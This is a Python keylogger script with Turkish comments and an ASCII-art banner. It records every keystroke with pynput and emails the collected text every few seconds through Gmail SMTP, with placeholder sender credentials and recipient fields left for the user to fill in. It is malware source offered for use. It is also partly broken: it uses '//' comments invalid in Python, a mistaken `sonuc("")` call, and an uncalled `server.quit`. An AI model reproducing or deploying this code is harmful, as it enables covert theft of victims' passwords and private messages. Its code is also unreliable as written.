import pynput.keyboard
import smtplib
import threading

print("""
                                                                                                
                                             .   ..''.                                              
                                           ',.  .,:dK0o'                                            
                                         .;;.    'lOWMWKl.                                          
                                         ;;   ..'ld0WMMMNo.                                         
                                        ,c.  .';cdkOKNWWMNl                                         
                                       .xx;'''''',,,;lxXWMX:                                        
                                      .l0kc,'..        .ckX0:                                       
                                     .xd,                 ,kKl                                      
                                     l0;                   ,Ol.                                     
                                     .ox;                 'oo.                                      
                                   ,lokNXo.             .lKNKkdc,                                   
                                 .lOo;;xkOd'           .oxoodxKWXd.                                 
                                .l0c    ..,;.         .''    .loo0x.                                
                              .cxl,.                         .'. ;0d.                               
                             ;xx;                                 cK0x'                             
                           .oKk;    .cccc::cc:::::::::::::;;;:c,  .coOOc.                           
                         .,dXOc.    ;o,...................   .c;     'kNO'                          
                        ;ONWNx,     ':.                       ;,     .lKNo                          
                       ,dxddxxlcc,. .,.        .',,'.         '.   ..;dKXOl,.                       
                            ...;;'. .'.        :OXKO;         .. .'cdkKOl,...                       
                                     ..        .;cc;.         .      ....                                 
""")

toplama = ""

def emir(harfler):
    global toplama
    print("===========================")
    try:
        toplama +=str(harfler.char)
    except AttributeError:
        if harfler == harfler.space:
            toplama += " "
        elif harfler==harfler.backspace:
            sayi = len(toplama)
            sayi -=1
            deger=0
            sonuc("")
            while sayi>deger:
                sonuc += toplama[deger]
                deger +=1
            toplama = sonuc
        elif harfler==harfler.enter:
            toplama += "\n"
        else:
            toplama += str(harfler)
    print(toplama)

sender_emmail = "mail@gmail.com" //Gönderim yapacak mail adresi
sender_password = "password" //Mail Şifresi

def mail_gonder(mesaj):
    global toplama
    server = smtplib.SMTP("smtp.gmail.com:587")
    server.starttls()
    server.login(sender_emmail, sender_password)
    server.sendmail("Gönderim Yapacak Mail Adresi","Gönderilecek Mail Adresi",mesaj)
    server.quit
    
def dallanma():
    global toplama
    mail_gonder(toplama)
    toplama=""
    timer = threading.Timer(5,dallanma) // Kaç Saniye aralıkla gönderim yapılacağını belirleyiniz öneri 5 10 sn
    timer.start()
    
dinleme = pynput.keyboard.Listener(on_press=emir)

with dinleme:
    dallanma()
    dinleme.join()
